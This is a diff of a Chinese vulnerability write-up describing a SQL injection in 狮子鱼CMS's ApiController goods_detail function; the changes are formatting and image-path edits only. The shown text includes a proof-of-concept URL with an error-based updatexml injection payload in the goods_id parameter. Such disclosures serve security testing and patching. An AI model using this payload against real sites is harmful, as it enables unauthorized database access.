@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-狮子鱼CMS ApiController.class.php  参数过滤存在不严谨，导致SQL注入漏洞
+狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞
 
 ## 漏洞影响
 
@@ -20,9 +20,9 @@
 
 登录界面如下
 
-![](images/202202170929987.png)
+![](<../.gitbook/assets/202202170929987 (1).png>)
 
-存在漏洞的文件为 **ApiController.class.php**  , 关键位置为
+存在漏洞的文件为 **ApiController.class.php** , 关键位置为
 
 ```php
 public function goods_detail()
@@ -60,12 +60,12 @@ public function goods_detail()
 		$goods = $goods_arr[0];
 ```
 
-![](images/202202170929236.png)
+![](../.gitbook/assets/202202170929236.png)
 
 漏洞测试为
 
-```plain
+```
 https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![](images/202202170929971.png)
+![](../.gitbook/assets/202202170929971.png)
